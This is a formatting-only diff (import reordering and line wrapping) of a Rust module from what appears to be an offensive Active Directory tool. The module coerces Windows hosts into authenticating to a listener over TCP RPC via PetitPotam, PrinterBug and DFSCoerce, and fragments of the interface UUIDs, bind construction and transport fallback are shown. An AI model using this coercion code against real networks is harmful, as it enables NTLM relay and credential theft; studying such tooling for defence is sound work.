@@ -1,12 +1,12 @@
 use overthrone_core::error::Result;
-use overthrone_core::proto::epm::resolve_uuid_via_epm_tcp;
 use overthrone_core::proto::coerce::{
-    CoercionResult, trigger_printer_bug, trigger_petitpotam, trigger_dfs_coerce,
+    CoercionResult, trigger_dfs_coerce, trigger_petitpotam, trigger_printer_bug,
 };
-use tokio::net::TcpStream;
+use overthrone_core::proto::epm::resolve_uuid_via_epm_tcp;
+use serde::{Deserialize, Serialize};
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
-use serde::{Serialize, Deserialize};
-use tracing::{info, debug};
+use tokio::net::TcpStream;
+use tracing::{debug, info};
 
 /// Coercion protocol selection
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
@@ -25,18 +25,18 @@ impl CoerceProtocol {
         match self {
             // MS-EFSR: df1941c5-fe89-4e79-bf10-463657acf44d
             Self::EfsRpc => [
-                0xc5, 0x41, 0x19, 0xdf, 0x89, 0xfe, 0x79, 0x4e,
-                0xbf, 0x10, 0x46, 0x36, 0x57, 0xac, 0xf4, 0x4d,
+                0xc5, 0x41, 0x19, 0xdf, 0x89, 0xfe, 0x79, 0x4e, 0xbf, 0x10, 0x46, 0x36, 0x57, 0xac,
+                0xf4, 0x4d,
             ],
             // MS-RPRN: 12345678-1234-abcd-ef00-0123456789ab
             Self::Rprn => [
-                0x78, 0x56, 0x34, 0x12, 0x34, 0x12, 0xcd, 0xab,
-                0xef, 0x00, 0x01, 0x23, 0x45, 0x67, 0x89, 0xab,
+                0x78, 0x56, 0x34, 0x12, 0x34, 0x12, 0xcd, 0xab, 0xef, 0x00, 0x01, 0x23, 0x45, 0x67,
+                0x89, 0xab,
             ],
             // MS-DFSNM: 4fc742e0-4a10-11cf-8273-00aa004ae673
             Self::EfsBackup => [
-                0xe0, 0x42, 0xc7, 0x4f, 0x10, 0x4a, 0xcf, 0x11,
-                0x82, 0x73, 0x00, 0xaa, 0x00, 0x4a, 0xe6, 0x73,
+                0xe0, 0x42, 0xc7, 0x4f, 0x10, 0x4a, 0xcf, 0x11, 0x82, 0x73, 0x00, 0xaa, 0x00, 0x4a,
+                0xe6, 0x73,
             ],
         }
     }
@@ -68,14 +68,20 @@ async fn send_tcp_coerce(
     opnum: u16,
 ) -> Result<CoercionResult> {
     let (host, port) = resolve_rpc_endpoint(target, &protocol.uuid()).await?;
-    info!("[CoerceTCP] {} resolved to {}:{}", protocol.name(), host, port);
+    info!(
+        "[CoerceTCP] {} resolved to {}:{}",
+        protocol.name(),
+        host,
+        port
+    );
 
     let addr = format!("{}:{}", host, port);
-    let mut stream = TcpStream::connect(&addr)
-        .await
-        .map_err(|e| overthrone_core::error::OverthroneError::custom(
-            format!("TCP connect to {} failed: {}", addr, e)
-        ))?;
+    let mut stream = TcpStream::connect(&addr).await.map_err(|e| {
+        overthrone_core::error::OverthroneError::custom(format!(
+            "TCP connect to {} failed: {}",
+            addr, e
+        ))
+    })?;
 
     // Build and send bind request
     let bind_req = build_tcp_bind(&protocol.uuid());
@@ -112,7 +118,8 @@ async fn send_tcp_coerce(
         success,
         message: format!(
             "TCP coercion via {} (port {}): status 0x{status:08X}",
-            protocol.name(), port
+            protocol.name(),
+            port
         ),
     })
 }
@@ -139,8 +146,8 @@ fn build_tcp_bind(interface_uuid: &[u8; 16]) -> Vec<u8> {
     buf.extend_from_slice(&1u16.to_le_bytes());
     buf.extend_from_slice(&0u16.to_le_bytes());
     buf.extend_from_slice(&[
-        0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,
-        0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60,
+        0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48,
+        0x60,
     ]);
     buf.extend_from_slice(&2u32.to_le_bytes());
     buf
@@ -176,14 +183,15 @@ async fn write_rpc_frame_tcp<T: AsyncWriteExt + Unpin>(
 }
 
 /// Read a BTF-framed RPC PDU over TCP.
-async fn read_rpc_frame_tcp<T: AsyncReadExt + Unpin>(
-    stream: &mut T,
-) -> std::io::Result<Vec<u8>> {
+async fn read_rpc_frame_tcp<T: AsyncReadExt + Unpin>(stream: &mut T) -> std::io::Result<Vec<u8>> {
     let mut len_buf = [0u8; 4];
     stream.read_exact(&mut len_buf).await?;
     let len = u32::from_le_bytes(len_buf) as usize;
     if len > 1_048_576 {
-        return Err(std::io::Error::new(std::io::ErrorKind::InvalidData, "RPC frame too large"));
+        return Err(std::io::Error::new(
+            std::io::ErrorKind::InvalidData,
+            "RPC frame too large",
+        ));
     }
     let mut buf = vec![0u8; len];
     stream.read_exact(&mut buf).await?;
@@ -256,9 +264,7 @@ pub async fn trigger_coerce_tcp(
 
 /// Coerce the target using the best available transport.
 /// Tries TCP first if prefer_tcp is set, otherwise uses named pipe.
-pub async fn coerce_with_fallback(
-    config: &CoercerConfig,
-) -> Result<CoercionResult> {
+pub async fn coerce_with_fallback(config: &CoercerConfig) -> Result<CoercionResult> {
     let target = &config.target;
     let listener = &config.listener;
 
@@ -267,7 +273,10 @@ pub async fn coerce_with_fallback(
             match trigger_coerce_tcp(target, listener, protocol).await {
                 Ok(result) if result.success => return Ok(result),
                 Ok(_) => debug!("TCP {} failed, falling back to named pipe", protocol.name()),
-                Err(e) => debug!("TCP {} error: {e}, falling back to named pipe", protocol.name()),
+                Err(e) => debug!(
+                    "TCP {} error: {e}, falling back to named pipe",
+                    protocol.name()
+                ),
             }
         }
 
@@ -376,16 +385,23 @@ mod tests {
         let encoded = ndr_string_tcp("héllo");
         assert_eq!(encoded.len() % 4, 0);
         // UTF-16 'é' = 0x00E9
-        assert!(encoded.windows(2).any(|w| w == [0xe9, 0x00]),
-            "Should contain UTF-16 encoded é");
+        assert!(
+            encoded.windows(2).any(|w| w == [0xe9, 0x00]),
+            "Should contain UTF-16 encoded é"
+        );
     }
 
     #[test]
     fn test_ndr_string_tcp_4byte_aligned() {
         for s in &["a", "ab", "abc", "abcd", "héllo_world_test"] {
             let encoded = ndr_string_tcp(s);
-            assert_eq!(encoded.len() % 4, 0,
-                "NDR string '{}' length {} not 4-byte aligned", s, encoded.len());
+            assert_eq!(
+                encoded.len() % 4,
+                0,
+                "NDR string '{}' length {} not 4-byte aligned",
+                s,
+                encoded.len()
+            );
         }
     }
 
